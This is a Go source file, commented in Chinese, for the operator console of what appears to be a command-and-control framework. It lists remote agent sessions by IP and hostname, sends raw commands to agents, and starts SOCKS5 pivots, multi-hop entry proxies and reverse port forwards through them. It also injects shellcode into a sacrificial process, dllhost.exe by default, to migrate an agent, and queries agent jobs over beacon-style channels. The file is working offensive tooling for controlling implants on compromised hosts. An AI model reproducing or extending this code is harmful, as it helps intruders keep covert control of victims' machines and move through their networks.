// CLI 运行时呈现方法(第 4 批 cobra 重写时自原 cli.go/cli_util.go 迁入):
// 会话呈现 / 命令收发 / 高频快捷拼装 / 代理与转发 / raw 透传 / 迁移 / 任务查看 / Agent 命令目录。
// 打印格式全部原样保留(用户肌肉记忆 + batch 脚本兼容)。
package cli

import (
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
)

// ---- 会话呈现 ----

func (c *CLI) list() {
	infos := c.svc.Sessions()
	if len(infos) == 0 {
		c.Println("无在线会话")
		return
	}
	c.Printf("%-6s %-22s %-18s %-12s\n", "ID", "IP", "主机名", "状态")
	for _, it := range infos {
		status := "上线"
		if !it.Online {
			status = "离线"
		}
		c.Printf("%-6d %-22s %-18s %-12s\n", it.ID, it.RemoteIP, it.Hostname, status)
	}
}

func (c *CLI) info() {
	if c.cur == 0 {
		c.Println("请先 select <id>")
		return
	}
	info, ok := c.svc.SessionInfo(c.cur)
	if !ok {
		c.Println("会话不存在")
		return
	}
	c.Printf("会话 #%d: %s (%s) @ %s\n", info.ID, info.Hostname, info.OS, info.RemoteIP)
}

func (c *CLI) ping() {
	if c.cur == 0 {
		c.Println("请先 select <id>")
		return
	}
	if _, err := c.svc.Command("", c.cur, "HeartbeatPing", nil, ""); err != nil {
		c.Println("Ping 失败:", err)
		return
	}
	c.Println("Pong")
}

// ---- 命令收发 ----

// sendMode 同步下发一条 Agent 命令并打印响应。
// 返回命令是否真正成功: 传输错误、或响应 status=error(Agent 拒绝/执行失败)均为 false。
// batch 据此统计真实成败。
func (c *CLI) sendMode(mode string, id int, cmd string, params map[string]interface{}) bool {
	start := time.Now()
	resp, err := c.svc.Command("", id, cmd, params, mode)
	elapsed := time.Since(start)
	if err != nil {
		c.Printf("命令失败: %v\n", err)
		return false
	}
	c.Printf("[%s] %s 耗时 %v\n", mode, cmd, elapsed.Round(time.Millisecond))
	ok := true
	if resp != nil {
		if st, hasStatus := resp["status"].(string); hasStatus && st != "success" {
			ok = false
		}
		c.Printf("%v\n", mustJSON(resp))
	}
	return ok
}

// rawFrame ⑮b②: CLI 透传任意帧(JSON), 指定 session_id 时优先于当前会话。
func (c *CLI) rawFrame(args []string) {
	if len(args) < 1 {
		c.Println(`用法: raw {"cmd":"FileListDir","params":{"path":"C:\"},"session_id":1,"mode":"push"}`)
		return
	}
	var frame map[string]interface{}
	if err := json.Unmarshal([]byte(strings.Join(args, " ")), &frame); err != nil {
		c.Println("JSON 解析失败:", err)
		return
	}
	cmdName, _ := frame["cmd"].(string)
	if cmdName == "" {
		c.Println("缺少 cmd")
		return
	}
	params, _ := frame["params"].(map[string]interface{})
	mode, _ := frame["mode"].(string)
	id := c.cur
	if v, ok := frame["session_id"].(float64); ok && v > 0 {
		id = int(v)
	}
	c.sendMode(mode, id, cmdName, params)
}

// ---- 代理与转发 ----

// pivotStart 为当前会话启动 SOCKS 出口。单跳: 目标即 SOCKS CONNECT 中的地址;
// 多跳链(chain=true): entryHost/entryPort 指向下一跳 Agent 的入口监听端口,
// 凭据按入口端口从 entry 注册表取(无登记则视为入口无鉴权)。
func (c *CLI) pivotStart(localPort string, chain bool, entryHost string, entryPort int) {
	if c.cur == 0 {
		c.Println("请先 select <id>")
		return
	}
	port, err := parseListenPort(localPort)
	if err != nil {
		c.Println("无效端口:", localPort)
		return
	}
	entryUser, entryPass := "", ""
	if chain {
		if user, pass, ok := c.svc.EntryCredFor(entryPort); ok {
			entryUser, entryPass = user, pass
		} else {
			c.Printf("警告: 入口端口 %d 无 entry 凭据登记, 按无鉴权入口尝试\n", entryPort)
		}
	}
	if err := c.svc.PivotAdd("", c.cur, port, entryHost, entryPort, entryUser, entryPass); err != nil {
		c.Println("SOCKS5 监听失败:", err)
		return
	}
	if chain {
		c.Printf("SOCKS5 chain on 127.0.0.1:%d via entry %s:%d\n", port, entryHost, entryPort)
	} else {
		c.Printf("SOCKS5 on 127.0.0.1:%d (session #%d) 例: curl -x socks5://127.0.0.1:%d http://<target>/\n", port, c.cur, port)
	}
}

// entry 在当前 Agent 上启动多跳入口(SOCKS5 服务端, TS 生成 RFC1929 凭据下发)。
func (c *CLI) entry(portArg string) {
	if c.cur == 0 {
		c.Println("请先 select <id>")
		return
	}
	port, err := parseListenPort(portArg)
	if err != nil {
		c.Println("无效端口:", portArg)
		return
	}
	user, pass, err := c.svc.EntryAdd("", c.cur, port)
	if err != nil {
		c.Println("entry 启动失败:", err)
		return
	}
	c.Printf("entry listening on agent port %d (bind 0.0.0.0, auth user=%s pass=%s)\n", port, user, pass)
}

// rportfwdCmd 反向端口转发: Agent 监听 listen_port, 入站流量经 Server 转发到 target。
func (c *CLI) rportfwdCmd(args []string) {
	if c.cur == 0 {
		c.Println("请先 select <id>")
		return
	}
	if len(args) == 1 && (args[0] == "list" || args[0] == "ls") {
		for _, info := range c.svc.Rportfwds() {
			if info.SessionID == c.cur {
				c.Printf("  - #%d :%d -> %s:%d\n", info.SessionID, info.ListenPort, info.TargetHost, info.TargetPort)
			}
		}
		return
	}
	if len(args) >= 1 && (args[0] == "stop" || args[0] == "del") {
		if len(args) < 2 {
			c.Println("用法: rportfwd stop <listen_port>")
			return
		}
		lport, err := strconv.Atoi(args[1])
		if err != nil || lport <= 0 || lport > 65535 {
			c.Println("无效端口:", args[1])
			return
		}
		if err := c.svc.RportfwdRemove("", c.cur, lport); err != nil {
			c.Println("rportfwd stop 失败:", err)
			return
		}
		c.Printf("rportfwd :%d stopped\n", lport)
		return
	}
	if len(args) < 3 {
		c.Println("用法: rportfwd <listen_port> <target_host> <target_port> | rportfwd stop <listen_port> | rportfwd list")
		return
	}
	lport, err := strconv.Atoi(args[0])
	if err != nil || lport <= 0 || lport > 65535 {
		c.Println("无效端口:", args[0])
		return
	}
	tport, err := strconv.Atoi(args[2])
	if err != nil || tport <= 0 || tport > 65535 {
		c.Println("无效目标端口:", args[2])
		return
	}
	if err := c.svc.RportfwdAdd("", c.cur, lport, args[1], tport); err != nil {
		c.Println("rportfwd 启动失败:", err)
		return
	}
	c.Printf("rportfwd: agent 监听 :%d -> server -> %s:%d\n", lport, args[1], tport)
}

// ---- 迁移 ----

// migrateCmd 迁移命令: 本地 shc 文件 → MigrateSpawn 混合帧(帧二进制体 = shc)。
// 语义(注入与迁移设计): 目标会话的 agent 注入牺牲进程后自退,
// 新实例经 machine_id 认领原会话。
func (c *CLI) migrateCmd(args []string) {
	if len(args) < 2 {
		c.Println("用法: migrate <sid> <shc_file> [target]")
		c.Println("  shc_file: dll2shc.py 产物(如 CleatAgent_shc.bin)")
		c.Println("  target:   牺牲进程完整路径(缺省 C:\\Windows\\System32\\dllhost.exe)")
		return
	}
	sid, err := parseSessionID(args[0], c.cur)
	if err != nil {
		c.Println("无效会话 ID:", err)
		return
	}
	shcFile := args[1]
	target := "C:\\Windows\\System32\\dllhost.exe"
	if len(args) > 2 {
		target = args[2]
	}

	shc, err := os.ReadFile(shcFile)
	if err != nil {
		c.Println("读取 shc 失败:", err)
		return
	}
	if len(shc) < 64 {
		c.Println("shc 文件过小, 疑似无效")
		return
	}

	resp, err := c.svc.MigrateSpawn(sid, target, shc)
	if err != nil {
		c.Println("下发失败:", err)
		return
	}
	c.Printf("✓ MigrateSpawn 已下发到会话 #%d (shc %d bytes, target %s)\n", sid, len(shc), target)
	if resp != nil {
		c.Printf("  响应: %s\n", mustJSON(resp))
	}
}

// ---- 任务查看(cli_tasks.go 的提交侧与此文件并列) ----

func (c *CLI) taskSubmit(sid int, cmd string, params map[string]interface{}, mode string) {
	id, err := c.svc.SubmitTask("", sid, cmd, params, mode)
	if err != nil {
		c.Println("任务提交失败:", err)
		return
	}
	c.Printf("任务 #%d 已提交到会话 #%d [%s %s]\n", id, sid, cmd, mode)
}

func (c *CLI) taskList(sid int) {
	tasks := c.svc.Tasks(sid)
	if len(tasks) == 0 {
		c.Println("无任务")
		return
	}
	c.Printf("%-6s %-8s %-20s %-10s %-12s\n", "TID", "会话", "命令", "状态", "模式")
	for _, t := range tasks {
		c.Printf("%-6d %-8d %-20s %-10s %-12s\n", t.ID, t.SessionID, t.Cmd, t.Status, t.Mode)
	}
}

func (c *CLI) taskInfo(tid int64) {
	tk, ok := c.svc.Task(tid)
	if !ok {
		c.Println("任务不存在:", tid)
		return
	}
	c.Printf("任务 #%d: 会话 #%d [%s %s] 状态=%s\n", tk.ID, tk.SessionID, tk.Cmd, tk.Mode, tk.Status)
	if tk.Result != "" {
		c.Println("结果:", tk.Result)
	}
}

// ---- Agent 任务(JobCenter 一问一答, ) ----
//
// 设计(用户裁定, 对齐 CS 式按需查询): 不做事件上报/服务端镜像 —— 操作员敲 jobs
// 时现打一发 JobList 到目标会话, Agent 拍全量快照回帧, "此刻真相"即取即显;
// 不缓存、不落 TS 任务表。代价: beacon 类通道需等一拍(下一个通信周期),
// TCP 会话近似即时。旧 TS 台账(store 任务表)保留在 jobs --local。

// agentJobs 查询单个会话的 Agent 任务并呈现(未选会话时提示)。
func (c *CLI) agentJobs(sid int) {
	if sid <= 0 {
		c.Println("未选择会话(先 use <id>);查看全部在线会话用 jobs all")
		return
	}
	c.Printf("会话 #%d Agent 任务(JobCenter 实时查询):\n", sid)
	resp, err := c.svc.Command("", sid, "JobList", nil, "push")
	if err != nil {
		c.Println("  查询失败:", err)
		return
	}
	c.printAgentJobs(resp)
}

// agentJobsAll 逐个在线会话查询(离线跳过; 单会话失败不中断后续)。
func (c *CLI) agentJobsAll() {
	online := 0
	for _, it := range c.svc.Sessions() {
		if !it.Online {
			continue
		}
		online++
		c.Printf("\n会话 #%d (%s) Agent 任务(JobCenter 实时查询):\n", it.ID, it.Hostname)
		resp, err := c.svc.Command("", it.ID, "JobList", nil, "push")
		if err != nil {
			c.Println("  查询失败:", err)
			continue
		}
		c.printAgentJobs(resp)
	}
	if online == 0 {
		c.Println("无在线会话")
	}
}

// printAgentJobs 把 JobList 响应表格化。
// Main/Infrastructure 两类按设计( "操作员不可见")过滤; Command/Ephemeral
// 保留 —— 查这一拍的 JobList 自身也在表里(冒烟脚本验证过), 属诚实暴露。
// roster_mismatch(登记表有、线程名册查无)非空时以告警段列出。
func (c *CLI) printAgentJobs(resp map[string]interface{}) {
	data, _ := resp["data"].(map[string]interface{})
	if data == nil {
		c.Println("  响应异常:", mustJSON(resp))
		return
	}
	jobs, _ := data["jobs"].([]interface{})
	type jobRow struct{ id, name, kind, state, age string }
	var rows []jobRow
	for _, j := range jobs {
		m, _ := j.(map[string]interface{})
		if m == nil {
			continue
		}
		kind := jsonStr(m["kind"])
		if kind == "Main" || kind == "Infrastructure" {
			continue // 框架类: 操作员不可见(设计)
		}
		rows = append(rows, jobRow{
			id:    jsonID(m["id"]),
			name:  jsonStr(m["name"]),
			kind:  kind,
			state: jsonStr(m["state"]),
			age:   humanAgeMs(m["age_ms"]),
		})
	}
	if len(rows) == 0 {
		c.Println("  (无活跃任务)")
	} else {
		c.Printf("  %-4s %-20s %-14s %-10s %s\n", "ID", "名称", "类型", "状态", "时长")
		for _, r := range rows {
			c.Printf("  %-4s %-20s %-14s %-10s %s\n", r.id, r.name, r.kind, r.state, r.age)
		}
	}
	if rm, _ := data["roster_mismatch"].([]interface{}); len(rm) > 0 {
		c.Printf("  [!] 名册对账差集 %d 条(登记表有、线程名册查无, 疑似漏网):\n", len(rm))
		for _, j := range rm {
			if m, _ := j.(map[string]interface{}); m != nil {
				c.Printf("      - #%s %s (%s)\n", jsonID(m["id"]), jsonStr(m["name"]), jsonStr(m["kind"]))
			}
		}
	}
}

// jsonStr 宽松取字符串(非字符串/空 → "-")。
func jsonStr(v interface{}) string {
	if s, ok := v.(string); ok && s != "" {
		return s
	}
	return "-"
}

// jsonID 宽松取 ID(JSON 数字解出为 float64, 整值还原为整数文本)。
func jsonID(v interface{}) string {
	if f, ok := v.(float64); ok && f == float64(int64(f)) {
		return strconv.FormatInt(int64(f), 10)
	}
	return fmt.Sprint(v)
}

// humanAgeMs age_ms → 人读时长(12m05s / 3s / 1h02m)。
func humanAgeMs(v interface{}) string {
	f, ok := v.(float64)
	if !ok || f < 0 {
		return "-"
	}
	ms := int64(f)
	switch {
	case ms < 1000:
		return fmt.Sprintf("%dms", ms)
	case ms < 60_000:
		return fmt.Sprintf("%ds", ms/1000)
	case ms < 3_600_000:
		return fmt.Sprintf("%dm%02ds", ms/60_000, (ms%60_000)/1000)
	default:
		return fmt.Sprintf("%dh%02dm", ms/3_600_000, (ms%3_600_000)/60_000)
	}
}

// ---- Agent 命令目录(cli_catalog.go 数据的呈现) ----

// showCmd 显示命令目录或单个命令详情。
func (c *CLI) showCmd(args []string) {
	if len(args) == 0 {
		c.showAllCmds()
		return
	}
	name := args[0]
	def := findCmd(name)
	if def == nil {
		// 尝试首字母大写
		def = findCmd(strings.ToUpper(name[:1]) + name[1:])
	}
	if def == nil {
		c.Printf("未知命令: %s\n", name)
		c.Println("试试 'cmd' 查看全部命令")
		return
	}
	c.showCmdDetail(def)
}

func (c *CLI) showAllCmds() {
	lastCat := ""
	for _, d := range agentCommands {
		if d.Category != lastCat {
			if lastCat != "" {
				c.Println()
			}
			c.Printf("  ─── %s ───\n", d.Category)
			lastCat = d.Category
		}
		paramHint := ""
		if len(d.Params) > 0 {
			keys := make([]string, len(d.Params))
			for i, p := range d.Params {
				keys[i] = p.Key
			}
			paramHint = " [" + strings.Join(keys, ", ") + "]"
		}
		c.Printf("    %-28s %s%s\n", d.Name, d.Desc, paramHint)
	}
	c.Println()
}

func (c *CLI) showCmdDetail(d *CmdDesc) {
	c.Printf("\n  %s — %s\n", d.Name, d.Desc)
	c.Printf("  分类: %s\n", d.Category)
	if len(d.Params) == 0 {
		c.Println("  参数: 无")
		c.Printf("\n  用法: send %s\n", d.Name)
	} else {
		c.Println("  参数:")
		for _, p := range d.Params {
			req := ""
			if p.Required {
				req = " (必填)"
			}
			if p.Example != "" {
				req += " 例: " + p.Example
			}
			c.Printf("    %-16s %s%s\n", p.Key, p.Label, req)
		}
		example := "send " + d.Name
		for _, p := range d.Params {
			if p.Required {
				example += " <" + p.Key + ">"
				break
			}
		}
		c.Printf("\n  用法: %s\n", example)
	}
	c.Println()
}
